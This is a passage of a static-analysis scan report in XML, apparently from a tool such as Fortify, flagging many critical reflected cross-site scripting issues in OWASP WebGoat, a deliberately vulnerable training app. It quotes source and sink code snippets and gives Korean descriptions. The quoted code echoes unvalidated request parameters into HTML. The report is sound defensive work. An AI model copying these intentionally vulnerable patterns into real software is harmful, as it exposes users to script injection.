                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B59982312F12B2D12C604C179A9ACB85" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="D2C4D5097B2586970BF696EDF290930C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>SearchStaff.jsp의 _jspService() 메서드가 11 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/SearchStaff.jsp</FilePath>
<LineStart>11</LineStart>
<Snippet>			{
			%&gt;
				Employee &lt;%=searchedName%&gt; not found.
			&lt;%
			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SearchStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/SearchStaff.jsp</FilePath>
<LineStart>7</LineStart>
<Snippet>			&lt;% 
			WebSession webSession = ((WebSession)session.getAttribute("websession"));
			String searchedName = request.getParameter(RoleBasedAccessControl.SEARCHNAME);
			if (searchedName != null)
			{</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="26B91C0F47B9FA11161710A90CB120F9" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.SSN%&gt;" type="text" value="&lt;%=employee.getSsn()%&gt;"/&gt; 
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="6A708BA29F9DD28706D9256DB7A434C1" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;span class="lesson_text_db"&gt;&lt;%=employee.getSsn()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0C452DD95EEB75FBD4E0080F1B2DDFF" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 119 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>119</LineStart>
<Snippet>				&lt;img src="images/buttons/hintLeft.jpg" alt="Previous Hint" name="hintLeft" width="22" height="20" border="0" id="hintLeft"/&gt;
				&lt;/a&gt;
				&lt;a href="attack?show=NextHint&amp;menu=&lt;%=menu%&gt;" target="_top" onclick="MM_nbGroup('down','group1','hint','',1)" 
				onmouseover="MM_nbGroup('over','hint','images/buttons/hintOver.jpg','',1)" 
				onmouseout="MM_nbGroup('out')"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>String lessonComplete = "&lt;img src=\"images/buttons/lessonComplete.jpg\"&gt;";
String m = "menu";
String menu = request.getParameter(m);

List categories = course.getCategories();</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F823DF60A920405312EAD8D12E68D5F5" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WsSAXInjection.java의 createContent() 메서드가 155 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>155</LineStart>
<Snippet>	    xml = xml + (password == null ? "[password]" : password);
	    xml = xml + template2;
	    pre.addElement(HtmlEncoder.encode(xml));
	    ec.addElement(pre);
</Snippet>
<TargetFunction>org.apache.ecs.html.PRE.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0E0CE8A9C2B1F827612536E92E906C5D" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 165 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY4", s.getParser()
			    .getStringParameter("QTY4", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY4", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0DA3A155CDF88D37323F65DE09455A6" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getAddress1()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1F71F0912325818B8D0A2B9FF71E589F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="B5EBC8C33B688B897B5C5D1EEBC8C9ED" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="BDC530F36AC693299AFA524089900733" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ReflectedXSS.java의 createContent() 메서드가 136 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ReflectedXSS.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/ReflectedXSS.java</FilePath>
<LineStart>136</LineStart>
<Snippet>	    tr.addElement(new TD().addElement(
		    new Input(Input.TEXT, "QTY2", s.getParser()
			    .getStringParameter("QTY2", "1")))
		    .setAlign("right"));
	    quantity = s.getParser().getFloatParameter("QTY2", 1.0f);</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="535C0D30E0E2024CF59AA5BC682735DB" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>BlindSqlInjection.java의 createContent() 메서드가 83 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>BlindSqlInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/BlindSqlInjection.java</FilePath>
<LineStart>83</LineStart>
<Snippet>		    "101");
	    Input input = new Input(Input.TEXT, ACCT_NUM, accountNumber
		    .toString());
	    ec.addElement(input);
</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1DA5EF11375B6EABE652605EE887451C" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getStartDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F0C452DD95EEB75FBD4E0080F1B2DE00" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 124 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>124</LineStart>
<Snippet>				&lt;img src="images/buttons/hint.jpg" alt="Hints" name="hint" width="35" height="20" border="0" id="hint"/&gt;
				&lt;/a&gt;
				&lt;a href="attack?show=NextHint&amp;menu=&lt;%=menu%&gt;" target="_top" onclick="MM_nbGroup('down','group1','hintRight','',1)" 
				onmouseover="MM_nbGroup('over','hintRight','images/buttons/hintRightOver.jpg','',1)" 
				onmouseout="MM_nbGroup('out')"&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>String lessonComplete = "&lt;img src=\"images/buttons/lessonComplete.jpg\"&gt;";
String m = "menu";
String menu = request.getParameter(m);

List categories = course.getCategories();</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameter()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F690C31C205894FC30A244333307C574" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 29 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>29</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9895F78F8B26B08B74945E04033FF52F" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 38 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>38</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;%=employee.getAddress2()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>690</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);
	String value;
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="3CBAC9D11F228AA2C599D3AA935DD4A6" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WeakSessionID.java의 makeLogin() 메서드가 262 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>262</LineStart>
<Snippet>	Input input1 = new Input(Input.TEXT, USERNAME, "");
	Input input2 = new Input(Input.PASSWORD, PASSWORD, "");
	Input input3 = new Input(Input.HIDDEN, SESSIONID, weakid);
	row1.addElement(new TD(input1));
	row2.addElement(new TD(input2));</Snippet>
<TargetFunction>org.apache.ecs.html.Input.Input()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>WebSession.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/WebSession.java</FilePath>
<LineStart>621</LineStart>
<Snippet>	public String getCookie( String cookieName )
	{
		Cookie[] cookies = getRequest().getCookies();

		for ( int i = 0; i &lt; cookies.length; i++ )</Snippet>
<TargetFunction>javax.servlet.http.HttpServletRequest.getCookies()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="164F50FC73966E07C13D9DBF85E6B422" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>JavaScriptValidation.java의 createContent() 메서드가 155 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>155</LineStart>
<Snippet>	    TextArea input3 = new TextArea("field3", 1, 25).addElement(param3);
	    TextArea input4 = new TextArea("field4", 1, 25).addElement(param4);
	    TextArea input5 = new TextArea("field5", 1, 25).addElement(param5);
	    TextArea input6 = new TextArea("field6", 1, 25).addElement(param6);
	    TextArea input7 = new TextArea("field7", 1, 25).addElement(param7);</Snippet>
<TargetFunction>org.apache.ecs.html.TextArea.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="11FA55D8F0417B4A234427DC70BDDB59" ruleID="DBDBBFC6-DE26-4FC5-8347-D48032B2BF5D">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WeakAuthenticationCookie.java의 makeUser() 메서드가 377 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WeakAuthenticationCookie.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakAuthenticationCookie.java</FilePath>
<LineStart>377</LineStart>
<Snippet>    {
	ElementContainer ec = new ElementContainer();
	ec.addElement(new P().addElement("Welcome, " + user));
	ec.addElement(new P().addElement("You have been authenticated with "
		+ method));</Snippet>
<TargetFunction>org.apache.ecs.html.P.addElement()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9B38754274822DFAC0FC5E5BF8A1FB91" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 180 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>180</LineStart>
<Snippet>						Parameter p = (Parameter) i.next();
						printParameters = "&lt;div id=\"parameter\" class=\"info\"&gt;" + p.getName() + "=" + p.getValue() + "&lt;/div&gt;&lt;br&gt;";
						out.println(printParameters);
					}
				}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.println()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>593</LineStart>
<Snippet>	}

	return request.getParameterValues(name);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="71E45B4E00B03052CBA4B83B895161BF" ruleID="45BF957F-1A34-4E28-9B34-FEB83EC96792">
                            <Category>Cross-Site Scripting: Reflected</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>main.jsp의 _jspService() 메서드가 163 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>main.jsp</FileName>
<FilePath>WebContent/main.jsp</FilePath>
<LineStart>163</LineStart>
<Snippet>			    {
			    	%&gt;
			    	&lt;div id="reset" class="info"&gt;&lt;a href="&lt;%=webSession.getRestartLink()%&gt;"&gt;Restart this Lesson&lt;/a&gt;&lt;/div&gt;
	    			&lt;%
	    			}</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
